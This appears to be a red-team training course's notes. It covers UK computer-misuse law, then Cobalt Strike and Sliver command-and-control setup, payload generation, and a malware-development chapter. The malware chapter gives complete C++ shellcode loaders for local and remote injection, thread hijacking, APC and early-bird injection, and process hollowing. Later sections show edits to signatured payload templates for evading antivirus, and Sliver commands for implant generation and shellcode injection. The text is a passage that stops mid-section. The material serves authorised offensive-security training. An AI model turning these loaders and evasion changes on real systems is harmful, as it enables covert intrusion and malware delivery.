1. Law & Compliance

Red team operations exist within a legal framework — understanding it isn't optional. This section covers the UK legislation directly relevant to authorised testing engagements and what it means when something goes wrong.

1.1 Computer Misuse Act

The CMA criminalises unauthorised access to computer systems and data. Motive is irrelevant — authorised testing requires explicit written permission. The original Act defined three core offences:

  • Section 1 — unauthorised access to computer material
  • Section 2 — unauthorised access with intent to commit a further offence
  • Section 3 — unauthorised acts with intent to impair operation

1.1.1 Police and Justice Act

  • Police & Justice Act 2006 — stronger intent requirement; Section 3A criminalises making, supplying, or obtaining tools for computer misuse

1.1.2 Serious Crime Act

  • Serious Crime Act 2015, s3ZA — up to 14 years for damage to infrastructure; life imprisonment where national security is at risk
  • Territorial scope extended — covers UK citizens operating abroad and attacks on UK systems from abroad

1.2 Human Rights Act

Two HRA articles are relevant to red team operations:

  • Article 8 — right to privacy; do not access personal devices or data (BYOD and WFH scenarios)
  • Article 10 — freedom of expression; relevant when operations touch communications

1.3 Data Protection Act

  • Testing systems containing personal data must itself comply with GDPR (Article 32 — implement appropriate technical measures)
  • A Data Processing Agreement is required when personal data is in scope
  • UK GDPR applies to any organisation processing EU resident data regardless of where the organisation operates

1.4 Sector Legislation

Sector-specific regulations may apply depending on the target's industry — for example, the NIS Regulations for critical infrastructure operators, FCA rules for financial services, and NHS DSPT for healthcare. Industry frameworks such as CBEST, TIBER-EU, and STAR-FS provide a structured approach for testing in regulated sectors.

2. C2 Infrastructure

Two primary C2 frameworks used in this course:

  • Cobalt Strike — commercial, mature OPSEC controls, Malleable C2, Aggressor scripting
  • Sliver — open-source (BishopFox), flexible protocols, no licensing cost

2.1 Cobalt Strike Primer

Cobalt Strike is a commercial C2 platform. Its implant (Beacon) simulates long-term actors with customisable traffic and behaviour.

  • Peer-to-peer Beacon chaining (SMB/TCP)
  • Malleable C2 profiles for traffic disguise
  • Aggressor scripting for custom automation
  • Built-in lateral movement, privilege escalation, and MITRE reporting

2.1.1 Distributed operations

Distributed ops use per-phase team servers (initial access, post-exploitation, persistence) — if one is burned, others survive. The course uses a single team server.

On launch, the client prompts for the team server's host, port, and password. A single client can connect to multiple team servers concurrently, with listeners and Beacon sessions consolidated into one UI.

2.2 Listeners

2.2.1 What is a listener?

A listener defines the protocol and parameters for Beacon to communicate with the team server. The five built-in protocols:

ProtocolClassTypical use
HTTPEgressBlends with web browsing; easiest to redirect
HTTPSEgressTLS-encrypted variant of HTTP
DNSEgressSurvives strict egress filtering; very low bandwidth
SMBPeer-to-peerNamed-pipe chain between Beacons
TCPPeer-to-peerDirect TCP chain between Beacons

2.2.2 Listener Types

  • Egress — communicate directly out of the network
  • Peer-to-peer — chain Beacons together, routing traffic through one egress point

2.2.3 HTTP listener

The HTTP listener directs Beacon to communicate with the team server via HTTP GET and/or POST requests. By default it will use GETs to fetch tasks from the team server and POSTs to send the results back. The team server starts a built-in web server to serve the requests.

HTTP hosts

Beacon HTTP hosts can point directly to the team server or to a redirector — an intermediary that proxies traffic. Common redirector tools: iptables, socat, Apache, NGINX.

Host rotation strategy

Multiple HTTP hosts with a rotation strategy adds C2 resiliency and defeats frequency analysis. Options: round-robin, random, failover, rotate.

Max retry strategy

Configures Beacon's self-destruct strategy when all HTTP hosts become unreachable. Syntax: exit-[max_attempts]-[increase_attempts]-[duration][m/h/d]:

  • max_attempts — total failures before Beacon exits
  • increase_attempts — failures before sleep time is increased
  • duration — new sleep interval; suffix m (minutes), h (hours), or d (days)

Example: exit-50-25-1h raises the sleep interval to 1 hour after 25 failed check-ins, then exits after 50 failures.

HTTP host (stager)

Stager payloads use only one host to fetch the full stage. It can match an existing HTTP host or be a different domain — as long as it resolves to the team server.

Profile

Malleable C2 profiles can be configured with multiple traffic variants, which can be selected from this dropdown. You will not see anything other than default unless you have loaded a profile that has multiple variants configured in it.

HTTP port (C2)

This is the HTTP port Beacon will attempt to connect to the team server on. Unless you want to use a non-standard port, you will in most cases keep this in-line with a port appropriate for the protocol. For example, 80 or 8080 for HTTP.

HTTP port (bind)

Bind Port sets the port the team server's web server listens on. Set it differently than the C2 port for port bending — e.g. all Beacons egress on port 80 while the team server listens internally on a different port.

HTTP host header

Setting a host header here will propagate it into the Beacon payload without having to explicitly set it within a Malleable C2 profile. This makes it more convenient to leverage domain fronting without hardcoding the domain in any of your profiles.

HTTP proxy

By default, Beacon will attempt to use the internet proxy configuration of the system it is running on. However, you can hardcode HTTP or SOCKS proxy information for the Beacon to use instead if required. This configuration is not applied to payload stagers.

Guardrails

Guardrails prevents stageless payloads from executing outside the target environment (e.g. sandboxes, forwarded emails). Checks:

  • Host IP address
  • Username
  • Hostname
  • Domain name

2.2.4 DNS listener

The DNS listener directs Beacon to communicate with a team server via DNS requests - specifically A, AAAA, or TXT record lookups. The team server starts a built-in DNS server to serve the requests.

For the DNS Beacon to work, you must add the necessary DNS records to make your team server authoritative for one or more subdomains. In most cases, a party like your domain registrar will be authoritative for your domain TLD.

The DNS Beacon checks in via A record lookups. Unlike HTTP Beacon, it doesn't transmit metadata immediately — it appears as an 'empty' row until tasked. Use checkin to force metadata transmission.

DNS resolver

By default, a DNS Beacon will use whatever DNS resolver the computer it's running on is configured with. You can overwrite this with a custom DNS resolver by entering its IP or hostname in this field.

2.2.5 SMB Listeners

The SMB listener is the first example of a listener that does not bind or listen on the team server VM - it only serves as a template for payload generation.

An SMB Beacon creates a named pipe (from listener config) on execution. Another Beacon must connect to relay traffic between the SMB Beacon and team server over port 445.

Cobalt Strike uses msagent_## by default, where ## are random hex values. However, you may use any pipe name you wish, as long as it does not clash with an existing name on the host. You may also create multiple SMB listeners with different pipe names.

2.2.6 TCP Listeners

Like the SMB listener, the TCP listener does not direct the team server to listen on any TCP ports. It provides configuration information when generating TCP Beacon payloads.

TCP Beacon binds to the configured C2 port and waits for another Beacon to connect and relay traffic to the team server. Binding: 0.0.0.0 (all interfaces) or 127.0.0.1 (localhost only) depending on the Bind to localhost only setting.

A TCP listener that binds to 0.0.0.0 could be used for lateral movement; and a listener that binds to 127.0.0.1 could be used for privilege escalation. You may create multiple TCP listeners with different port numbers and bind configurations.

2.3 Beacon Payloads

Most C2 agents are written as DLLs and paired with a loader that maps them into memory at runtime. Cobalt Strike ships two loader styles:

Stomped loaderPrepended loader
LayoutLoader stub overwrites the DOS headerLoader is prepended in front of the PE
OriginStephen Fewer's reflective DLL injectionDerived from DoublePulsar (CS 4.11+)
EntryStub jumps to ReflectiveLoader export in .textLoader runs first; no exported function required
ObfuscationLimited — PE structure preservedBody can be encoded, encrypted, or compressed
StealthLower — DOS header tampering is an IOCHigher — header is intact, body opaque

2.3.1 Stomped loader

Beacon uses reflective DLL injection (Stephen Fewer's design). The ReflectiveLoader export maps a fresh copy of the DLL into memory at runtime; a small shellcode stub overwrites the PE's DOS header to jump execution to ReflectiveLoader in .text.

2.3.2 Prepended loader

Since CS 4.11, Beacon uses a newer style derived from DoublePulsar (built by the NSA, leaked by The Shadow Brokers, best known for EternalBlue and WannaCry). The loader sits in front of the PE rather than inside it, giving three advantages:

  • No shellcode stub over the DOS header
  • Can reflectively load any PE — no exported function required
  • PE body can be encoded, encrypted, or compressed; the loader deobfuscates at runtime

2.3.3 Staged vs stageless payloads

Cobalt Strike decouples exploits from payloads — the exploit triggers code execution; the payload is what runs (e.g. Beacon shellcode). Delivery size constraints, from either the vulnerability or the channel, drive the staged vs stageless decision.

StagerStageless
Size~890 bytes~307 KB (~345× larger)
OperationFetches the full stage over a secondary channel (HTTP, DNS) and runs in memorySelf-contained — runs Beacon directly
Server authenticationNone — vulnerable to C2 hijacking at initial fetchEmbeds team server's public key; metadata encrypted on first checkin
Memory hygieneAllocates RWX (saves API calls)RW → RX flip; avoids anomalous RWX
CodeHand-optimised assemblyCompiled C with full safety measures
Payload security

On startup, the team server generates a public/private keypair. Each stageless payload embeds the server's public key to encrypt Beacon metadata, preventing C2 hijacking. Every Beacon also uses a unique session key for task and output encryption, transmitted inside the encrypted metadata. Stagers lack this — they reach out to the configured host/port with no server validation.

OPSEC

Stagers omit safety measures to stay small. Stageless payloads use RW → RX memory to avoid the anomalous RWX pattern; stagers skip the extra API call to save bytes.

2.3.4 Generating payloads

Beacon payloads can be generated from the Payloads menu.

HTML application

HTA files combine HTML and VBScript and execute via mshta.exe — historically supported by Internet Explorer, which made them a popular phishing payload format. The dialog prompts for a listener and an execution method:

  • Executable — drops and runs a Beacon EXE
  • PowerShell — runs a PowerShell one-liner that downloads and executes a stager
  • VBA — runs Beacon shellcode inline via VBScript and Win32 APIs

The HTA always delivers an x86 Beacon payload.

MS Office macro

This option will produce a VBA macro that you can paste into an Office document - another popular phishing payload format.

This macro always delivers an x86 Beacon payload.

Stager payload generator

These payload generators produce source code files for a variety of languages, equivalent to Metasploit's msfvenom utility. These are useful when you want a byte array that you can drop into your own shellcode runners.

For example, outputting a stager in C produces the following:

/* length: 888 bytes */
unsigned char buf[] = "\xfc\x48\x83\xe4[...snip...]\x12\x1d\x9b\x09";

Stager payloads do not allow you to specify any additional configuration details, such as guardrails.

Stageless payload generator

The stageless payload generator works the same way as the stager payload generator but exposes additional options.

Exit Function

Controls what happens when Beacon's exit is called:

  • ExitProcess (xprocess) — terminates the entire host process. Use when you spawned the process yourself.
  • ExitThread (xthread) — terminates only the Beacon thread. Use when injected into an existing process.
System Call

Tells Beacon to use direct system calls instead of Win32 APIs for its internal operation:

  • Standard — calls Win32 APIs (ntdll → kernel32) — easiest to hook
  • Direct syscall — invokes the syscall instruction directly — bypasses user-mode hooks
Windows stager/stageless payload

These mirror the stager/stageless payload generators but emit pre-built executables instead of raw source. Output formats:

  • .exe — standalone executable
  • .svc.exe — service binary suitable for SCM-based execution (PsExec)
  • .dll — DLL for rundll32 or DLL hijack loading
  • .bin — raw shellcode

Each can be signed with a code-signing certificate.

Windows Stageless Generate All Payloads

This option will generate all possible stageless payload variants for every available listener in both x86 and x64 architectures.

2.3.5 Payload flow

The Beacon build pipeline runs in three stages:

  1. Patch listener config (and optional syscalls) into the raw Beacon DLL
  2. Prepend the loader — customise with the BEACON_RDLL_GENERATE Aggressor hook
  3. Output as raw .bin shellcode, or patch into an artifact template — a format-specific hook is available per step

2.4 Interacting with Beacon

When a new Beacon session first checks into the team server, a record appears in the Event Log (View > Event Log) and the session is added to both the table and graph views.

A blue monitor icon denotes a Beacon running in medium integrity (standard user). A red monitor icon with an asterisk after the username denotes high integrity (local administrator or SYSTEM).

Beacon embeds metadata — encrypted with the team server's public key — in each HTTP/S check-in (URL, header, or cookie). This binding prevents a Beacon from being redirected to or tasked by a different team server.

To interact with a Beacon, double-click its row or right-click and select Interact. Type help at the prompt for a list of commands:

beacon> help

Beacon Commands
===============

    Command                   Description
    -------                   -----------
    [...snip...]
    getuid                    Get User ID

Use help <command> for detail on a specific command:

beacon> help getuid
Use: getuid

Prints the User ID associated with the current token

Typing a valid command queues a job. Multiple commands can be queued while waiting for the next check-in, and the queue can be cleared with clear.

[02/26 15:52:55] beacon> getuid
[02/26 15:52:55] [*] Tasked beacon to get userid

On check-in, the team server sends queued jobs in the traffic response. The client logs the send:

[02/26 15:52:59] [+] host called home, sent: 8 bytes

Beacon processes each job in order and returns results to the operator:

[02/26 15:52:59] [*] You are DESKTOP-FGSTPS7\Attacker

2.4.1 Session Graph View

The graph view trades detail for clarity — it shows fewer columns than the table view but makes Beacon relationships obvious.

  • Firewall icon + dashed line — egress Beacon talking directly to the team server
  • Solid lines — P2P connections between Beacons
  • Line colour — protocol in use (HTTP, HTTPS, DNS, SMB, TCP)

Right-click the background for layout options (default: Tree > Left). Right-clicking a Beacon opens the same interaction menu as the table view.

2.5 Sliver Primer

Sliver is an open-source C2 framework by BishopFox. It supports multiple protocols (mTLS, WireGuard, HTTP/S, DNS), uses implants called sessions, and compiles stage-0 shellcode on the fly. No licensing cost; good for environments where Cobalt Strike isn't available.

2.5.1 Setup & Server

# Start the Sliver server
sliver-server

# Connect as a client
sliver-client
ConceptCobalt Strike Equivalent
SessionBeacon
Implant profileMalleable C2 profile
Stage listenerStager listener
ArmoryAggressor Script + BOFs

2.5.2 Listeners

  • mTLS — mutual TLS; most OPSEC-safe default
  • WireGuard — VPN tunnel; useful for pivoting
  • HTTP/S — standard web traffic; easiest to proxy
  • DNS — slowest; most egress-tolerant
# Start HTTPS listener
https -l 443

# Generate implant (HTTPS)
generate --http https://teamserver.example.com --os windows --arch amd64 --format exe -s /tmp/implant.exe

# Start mTLS listener
mtls -l 443

# Generate shellcode (position-independent)
generate --mtls teamserver.example.com:443 --os windows --arch amd64 --format shellcode -s /tmp/sliver.bin

2.5.3 Sessions & Commands

# List active sessions
sessions

# Interact with a session
use <session-id>

# Shell commands
shell
execute -o whoami
execute -o ipconfig /all

# File operations
ls
download C:\Users\bob\Desktop\file.txt
upload /local/file.exe C:\Windows\Temp\file.exe

# Process injection (shellcode into PID)
inject --pid 1234 --shellcode /tmp/sliver.bin

# Port forwarding
portfwd add --remote 10.10.10.5:445

# SOCKS proxy
socks5 start --port 1080

2.5.4 Armory (BOFs & Extensions)

# Install armory
armory install all

# Run a BOF (e.g. whoami)
sa-whoami

# Load a .NET assembly
execute-assembly --process notepad.exe SharpHound.exe -c All

3. Malware Development

Every payload you deliver starts here. Understanding process architecture, injection primitives, and the Windows API through P/Invoke gives you the foundation to write loaders that don't trip signatures — and to understand why off-the-shelf tools get caught.

3.1 Malware Essentials

  • C2 implants are DLLs paired with a loader that maps the DLL from memory rather than disk
  • Loader + DLL = shellcode (.bin) — injected into memory with a new thread
  • Ready-to-run payloads (.exe, .dll, .ps1) embed shellcode in a shellcode runner

3.1.1 PE file structure

The PE format holds the data and metadata needed to load a program into memory. Both .exe and .dll files are PEs. The on-disk layout is, in order: DOS header → DOS stub → NT headers → section headers → sections.

3.1.2 DOS header

Fixed 64-byte structure (IMAGE_DOS_HEADER) at the start of every PE. Two relevant fields:

  • e_magic — the MZ signature (0x5A4D)
  • e_lfanew — file offset to the NT headers

3.1.3 DOS stub

Legacy stub that prints "This program cannot be run in DOS mode". Modern loaders skip it via e_lfanew.

3.1.4 NT headers

The NT headers (IMAGE_NT_HEADERS) consist of the PE signature, a file header (machine type, section count, characteristics) and an optional header (entry point, image base, data directories).

Data directories

Each entry is an IMAGE_DATA_DIRECTORY with a VirtualAddress and Size. The import directory entry lists DLLs the PE depends on.

3.1.5 Sections

PE sections hold the program's code and data — common ones are .text (code), .rdata (read-only data), .data (writable data), and .rsrc (resources). Each section has a header describing its name, virtual address, raw size, and memory protection.

3.2 Processes

A process is a container for a running program — isolated memory, handles, and security context. Multiple instances run in separate processes. The Win32 process creation APIs all funnel through NtCreateUserProcess in the kernel:

  • CreateProcessW — inherits the caller's token
  • CreateProcessAsUserW — specifies an alternate token
  • CreateProcessWithLogonW — creates with plaintext credentials

3.2.1 Threads

A thread executes instructions within a process — it holds CPU register state and a call stack. Both creation APIs call NtCreateThreadEx:

  • CreateThread — new thread in the current process
  • CreateRemoteThread — new thread in another process (a key injection primitive)

3.2.2 Memory

Memory is managed in pages (4KB or 2MB on x64). Key allocation API families:

  • VirtualAlloc / VirtualAllocEx — reserve and commit pages with a given protection
  • HeapAlloc — allocate from a process heap
  • NtMapViewOfSection — map a section object into the address space

3.2.3 Access Tokens

Every process has a primary access token containing user SID, group SIDs, and privileges. All actions are evaluated against this token. Threads inherit the process's primary token by default but may also impersonate another user's token — work under that thread then runs in the impersonated security context.

Every securable object has a DACL. Windows checks the caller's token against it and grants or denies access accordingly.

3.2.4 Privileges

A privilege grants a principal the right to perform a system operation (e.g. SeTimeZonePrivilege, SeShutdownPrivilege). Privileges are assigned via GPO or secpol. The following are effectively equivalent to local admin:

  • SeDebugPrivilege — debug any process (read/write memory)
  • SeImpersonatePrivilege — impersonate a client after authentication
  • SeAssignPrimaryTokenPrivilege — replace a process token
  • SeTcbPrivilege — act as part of the operating system
  • SeBackupPrivilege / SeRestorePrivilege — bypass file ACLs for read/write
  • SeLoadDriverPrivilege — load and unload kernel drivers
  • SeTakeOwnershipPrivilege — take ownership of any securable object

3.2.5 Termination

  • ExitProcess — graceful self-termination; DLLs get cleanup time
  • TerminateProcess — forceful; kills threads immediately, no cleanup, risk of data corruption

3.3 Process Injection

Process injection [T1055] runs shellcode inside a trusted process to inherit its security context and evade defences. Multiple techniques exist — the techniques below are the most common primitives.

3.3.1 Classic injection

Uses VirtualAlloc + WriteProcessMemory + CreateThread — injects and executes shellcode in the current process.

#include <Windows.h>

int main()
{
    unsigned char shellcode[] = "..."; // your shellcode goes here

    // allocate a region of memory
    auto hMemory = VirtualAlloc(
        NULL,                       // we don't mind where it's allocated
        sizeof(shellcode),          // the size of memory region
        MEM_COMMIT | MEM_RESERVE,   // type of memory allocation
        PAGE_EXECUTE_READWRITE      // memory protection
    );
    
    // write the shellcode into memory
    SIZE_T bytesWritten = 0;
    WriteProcessMemory(
        GetCurrentProcess(),    // handle to target process
        hMemory,                // pointer to target memory region
        &shellcode,             // pointer to data to write
        sizeof(shellcode),      // length of data to write
        &bytesWritten           // receives the number of bytes written
    );

    // create a new thread
    DWORD threadId = 0;
    auto hThread = CreateThread(
        NULL,
        0,
        (LPTHREAD_START_ROUTINE)hMemory,  // a pointer to the thing to execute
        NULL,
        0,
        &threadId                         // receives the new thread ID
    );

    // wait for the thread to finish
    WaitForSingleObject(
        hThread,    // the handle to wait on
        INFINITE    // the length of time to wait
    );
    
    // close the thread handle
    CloseHandle(hThread);
}

3.3.2 Classic remote injection

Same pattern for a remote process — open a handle with OpenProcess, then VirtualAllocEx + WriteProcessMemory + CreateRemoteThread.

#include <Windows.h>

int main(int argc, char* argv[])
{
    unsigned char shellcode[] = "...";

    // convert the provided argument to an integer
    auto pid = atoi(argv[1]);

    // get handle to process
    auto hProcess = OpenProcess(
        PROCESS_ALL_ACCESS, // desired access level
        FALSE,
        pid                 // target process ID
    );

    // sanity check the handle is valid
    if (hProcess == INVALID_HANDLE_VALUE) {
        return 0;
    }

    // allocate a region of memory
    auto hMemory = VirtualAllocEx(
        hProcess,   // handle to target process
        NULL,
        sizeof(shellcode),
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    );
    
    // write the shellcode into memory
    SIZE_T bytesWritten = 0;
    WriteProcessMemory(
        hProcess,
        hMemory,
        &shellcode,
        sizeof(shellcode),
        &bytesWritten
    );

    // create a new thread
    DWORD threadId = 0;
    auto hThread = CreateRemoteThread(
        hProcess,   // handle to target process
        NULL,
        0,
        (LPTHREAD_START_ROUTINE)hMemory,
        NULL,
        0,
        &threadId
    );

    // wait for the thread to finish
    WaitForSingleObject(
        hThread,
        INFINITE
    );
    
    // close the thread handle
    CloseHandle(hThread);
}

3.3.3 Thread hijacking

AV can hook thread creation and inspect the start address. Workaround: create the thread suspended pointing at a benign location, then use GetThreadContext/SetThreadContext to redirect RIP to shellcode before resuming.

#include <Windows.h>

void dummy() {
    // do nothing
}

int main()
{
    unsigned char shellcode[] = "...";

    // allocate a region of memory
    auto hMemory = VirtualAlloc(
        NULL,
        sizeof(shellcode),
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    );

    // write the shellcode into memory
    SIZE_T bytesWritten = 0;
    WriteProcessMemory(
        GetCurrentProcess(),
        hMemory,
        &shellcode,
        sizeof(shellcode),
        &bytesWritten
    );

    // create a suspended thread pointing at a dummy function
    DWORD threadId = 0;
    auto hThread = CreateThread(
        NULL,
        0,
        (LPTHREAD_START_ROUTINE)&dummy,
        NULL,
        CREATE_SUSPENDED,
        &threadId
    );

    // little sleep
    Sleep(5 * 1000);

    // get current thread's context
    CONTEXT ctx = { 0 };
    ctx.ContextFlags = CONTEXT_ALL;

    GetThreadContext(hThread, &ctx);

    // point thread context at shellcode
    ctx.Rip = (DWORD64)hMemory;
    SetThreadContext(hThread, &ctx);

    // resume the thread
    ResumeThread(hThread);

    // wait on thread
    WaitForSingleObject(hThread, INFINITE);

    // close handle
    CloseHandle(hThread);
}

3.3.4 Asynchronous Procedure Calls

Queue shellcode as an APC on an existing thread. Fires when the thread enters an alertable state (e.g. calls SleepEx). Get thread ID via Thread32First/Thread32Next.

#include <Windows.h>
#include <tlhelp32.h>

int main(int argc, char* argv[])
{
    unsigned char shellcode[] = "...";

    // convert the provided argument to an integer
    auto pid = atoi(argv[1]);

    DWORD threadId = 0;

    // create thread snapshot
    auto hSnapshot = CreateToolhelp32Snapshot(
        TH32CS_SNAPTHREAD,
        0
    );

    THREADENTRY32 te = { 0 };
    te.dwSize = sizeof(te);

    // walk the threads
    Thread32First(hSnapshot, &te);

    do {
        if (te.dwSize >= FIELD_OFFSET(THREADENTRY32, th32OwnerProcessID) + sizeof(te.th32OwnerProcessID)) {
            if (te.th32OwnerProcessID == pid) {
                // use the first thread we find
                threadId = te.th32ThreadID;
                break;
            }
        }
        te.dwSize = sizeof(te);
    } while (Thread32Next(hSnapshot, &te));

    if (threadId == 0) {
        // we failed to find a thread
        return 0;
    }

    // get a handle to the process
    auto hProcess = OpenProcess(
        PROCESS_ALL_ACCESS,
        FALSE,
        pid
    );

    // allocate a region of memory
    auto hMemory = VirtualAllocEx(
        hProcess,
        NULL,
        sizeof(shellcode),
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    );

    // write the shellcode into memory
    SIZE_T bytesWritten = 0;
    WriteProcessMemory(
        hProcess,
        hMemory,
        &shellcode,
        sizeof(shellcode),
        &bytesWritten
    );

    // open handle to target thread
    auto hThread = OpenThread(
        THREAD_ALL_ACCESS,
        FALSE,
        threadId
    );

  	// queue the apc
    QueueUserAPC(
        (PAPCFUNC)hMemory,  // target function
        hThread,            // target thread
        0
    );
}

3.3.5 Early bird

Plain APC injection has no guarantee the target thread will ever enter an alertable state — queueing on every thread instead almost always crashes the process. Early bird avoids both: spawn a process suspended, queue the APC on its primary thread, then resume. The APC fires deterministically on resume.

#include <Windows.h>

int main()
{
    unsigned char shellcode[] = "...";

    STARTUPINFOW si = { 0 };
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW;

    PROCESS_INFORMATION pi = { 0 };

    // spawn process in suspended state
    CreateProcess(
        L"C:\\Windows\\System32\\cmd.exe",
        NULL,
        NULL,
        NULL,
        FALSE,
        CREATE_SUSPENDED,
        NULL,
        L"C:\\Windows\\System32",
        &si,
        &pi
    );

    // allocate a region of memory
    auto hMemory = VirtualAllocEx(
        pi.hProcess,    // handle to newly spawned process
        NULL,
        sizeof(shellcode),
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    );

    // write the shellcode into memory
    SIZE_T bytesWritten = 0;
    WriteProcessMemory(
        pi.hProcess,
        hMemory,
        &shellcode,
        sizeof(shellcode),
        &bytesWritten
    );

    // queue the apc
    QueueUserAPC(
        (PAPCFUNC)hMemory,
        pi.hThread,
        0
    );

    // resume the process
    ResumeThread(pi.hThread);

    // tidy up our handles
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
}

3.3.6 Process hollowing

Spawn a process suspended, overwrite the PE entry point with shellcode (partial hollowing) or unmap/remap a new PE (full hollowing). Locate entry point: NtQueryInformationProcess → PEB.ImageBaseAddress → e_lfanew → OptionalHeader.AddressOfEntryPoint.

#include <Windows.h>
#include <winternl.h>

#pragma comment(lib, "ntdll.lib")

int main()
{
    unsigned char shellcode[] = "...";

    STARTUPINFOW si = { 0 };
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW;

    PROCESS_INFORMATION pi = { 0 };

    // spawn process in suspended state
    CreateProcess(
        L"C:\\Windows\\System32\\cmd.exe",
        NULL,
        NULL,
        NULL,
        FALSE,
        CREATE_SUSPENDED,
        NULL,
        L"C:\\Windows\\System32",
        &si,
        &pi
    );

    // get the process information to find the address of the PEB
    PROCESS_BASIC_INFORMATION pbi = { 0 };
    ULONG returnLength;
    NtQueryInformationProcess(
        pi.hProcess,
        ProcessBasicInformation,
        &pbi,
        sizeof(pbi),
        &returnLength
    );

    // the image base address is always at PEB + 0x10 for x64
    auto lpBaseAddress = (LPVOID)((DWORD64)(pbi.PebBaseAddress) + 0x10);

    // read the base address (addresses are 8 bytes for x64)
    LPVOID baseAddress = 0;
    SIZE_T bytesRead = 0;
    ReadProcessMemory(
        pi.hProcess,
        lpBaseAddress,
        &baseAddress,
        8,
        &bytesRead
    );

    // now we can read the dos header
    IMAGE_DOS_HEADER dHeader = { 0 };
    ReadProcessMemory(
        pi.hProcess,
        baseAddress,
        &dHeader,
        sizeof(dHeader),
        &bytesRead
    );

    // use e_lfanew to calculate pointer to nt header
    auto lpNtHeader = (LPVOID)((DWORD64)baseAddress + dHeader.e_lfanew);

    // read the nt header
    IMAGE_NT_HEADERS ntHeaders = { 0 };
    ReadProcessMemory(
        pi.hProcess,
        lpNtHeader,
        &ntHeaders,
        sizeof(ntHeaders),
        &bytesRead
    );

    // calculate the entry point address
    auto entryPoint = (LPVOID)((DWORD64)baseAddress + ntHeaders.OptionalHeader.AddressOfEntryPoint);

    // write shellcode to this location, overwriting the PE
    SIZE_T bytesWritten = 0;
    WriteProcessMemory(
        pi.hProcess,
        entryPoint,
        shellcode,
        sizeof(shellcode),
        &bytesWritten
    );

    // resume the process
    ResumeThread(pi.hThread);
}

3.4 P/Invoke

P/Invoke ([DllImport] + extern) calls Win32 APIs from C#. Example for OpenProcess:

[DllImport("kernel32.dll", SetLastError = true)]
[DefaultDllImportSearchPaths(DllImportSearchPath.System32)]
internal static extern IntPtr OpenProcess(
    PROCESS_ACCESS_RIGHTS dwDesiredAccess, 
    bool bInheritHandle,
    int dwProcessId);
  • SetLastError = true — recover last error via Marshal.GetLastWin32Error()
  • DefaultDllImportSearchPaths — forces System32 lookup, prevents DLL hijacking
  • No Windows.h in C# — define structs/enums manually or use pinvoke.net
[Flags]
internal enum PROCESS_ACCESS_RIGHTS : uint
{
    PROCESS_TERMINATE = 0x00000001,
    PROCESS_CREATE_THREAD = 0x00000002,
    PROCESS_SET_SESSIONID = 0x00000004,
    PROCESS_VM_OPERATION = 0x00000008,
    PROCESS_VM_READ = 0x00000010,
    PROCESS_VM_WRITE = 0x00000020,
    PROCESS_DUP_HANDLE = 0x00000040,
    PROCESS_CREATE_PROCESS = 0x00000080,
    PROCESS_SET_QUOTA = 0x00000100,
    PROCESS_SET_INFORMATION = 0x00000200,
    PROCESS_QUERY_INFORMATION = 0x00000400,
    PROCESS_SUSPEND_RESUME = 0x00000800,
    PROCESS_QUERY_LIMITED_INFORMATION = 0x00001000,
    PROCESS_SET_LIMITED_INFORMATION = 0x00002000,
    PROCESS_ALL_ACCESS = 0x001FFFFF,
    PROCESS_DELETE = 0x00010000,
    PROCESS_READ_CONTROL = 0x00020000,
    PROCESS_WRITE_DAC = 0x00040000,
    PROCESS_WRITE_OWNER = 0x00080000,
    PROCESS_SYNCHRONIZE = 0x00100000,
    PROCESS_STANDARD_RIGHTS_REQUIRED = 0x000F0000
}

3.4.1 Marshalling

Win32 APIs have A (ANSI) and W (Unicode) variants. Specify CharSet = CharSet.Unicode in [DllImport] for the W variants.

// ANSI
[DllImport("KERNEL32.dll", SetLastError = true, CharSet = CharSet.Ansi)]
[DefaultDllImportSearchPaths(DllImportSearchPath.System32)]
internal static extern IntPtr LoadLibraryA(string libFileName);

// Unicode
[DllImport("KERNEL32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
[DefaultDllImportSearchPaths(DllImportSearchPath.System32)]
internal static extern IntPtr LoadLibraryW(string libFileName);

3.4.2 Resources

Use pinvoke.net for pre-made C# P/Invoke signatures.

4. Defence Evasion

Defence Evasion addresses two detection surfaces: static signatures and behavioural heuristics. AV and EDR products combine both:

  • Signatures — target static portions of payloads (raw DLL, loader, artifacts) on disk or at load time
  • Behavioural heuristics — detect post-exploitation actions at runtime (process spawning, shell commands, remote injection, third-party tools)

This chapter covers payload artefact modification, loader memory layout, Beacon post-ex behaviour control, and AppLocker bypass.

4.1 Artifact Kit

Cobalt Strike ships a collection of stage-0 payload templates that form the basis of the .exe, .svc.exe, and .dll payloads. The default artifacts are frequently signatured because they're consistent across CS deployments. The Artifact Kit provides source code for these templates so operators can modify the signatured sections.

The kit is organised as follows:

  • src-main/main.c, svcmain.c, dllmain.c — entry points for the .exe, .svc.exe, and .dll templates
  • src-common/bypass-*.c — anti-sandbox techniques; select one with BYPASS in the Makefile

After modifying the source, run make, then load the Artifact Kit Aggressor script in the client. A common modification: replace .NET's Marshal.Copy (frequently signatured) with a P/Invoke to the native WriteProcessMemory.

In template.x64.ps1, find line 32:

[System.Runtime.InteropServices.Marshal]::Copy($var_code, 0, $var_buffer, $var_code.Count)

Replace it with:

$var_wpm = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((func_get_proc_address kernel32.dll WriteProcessMemory), (func_get_delegate_type @([IntPtr], [IntPtr], [Byte[]], [UInt32], [IntPtr]) ([Bool])))
$ok = $var_wpm.Invoke([IntPtr]::New(-1), $var_buffer, $var_code, $var_code.Count, [IntPtr]::Zero)

Verify with ThreatCheck:

PS C:\Tools\cobaltstrike\custom-resources> C:\Tools\ThreatCheck\ThreatCheck\bin\Debug\ThreatCheck.exe -f .\template.x64.ps1 -e amsi
[+] No threat found!
[*] Run time: 0.19s

Load resources.cna into the client before the new resources take effect.

4.2 Resource Kit

The Resource Kit ships the PowerShell, VBScript, and HTA script templates used by Beacon's PowerShell command, Scripted Web Delivery, and Office macro attacks. Like the Artifact Kit, the defaults are widely signatured, and the kit provides the source for modification.

4.2.1 Anti-Malware Scan Interface

compress.ps1

This template is used by Cobalt Strike's Scripted Web Delivery attack. CS takes template.[x64|x86].ps1, gzip-compresses and base64-encodes it, then patches the result into the %%DATA%% placeholder in compress.ps1:

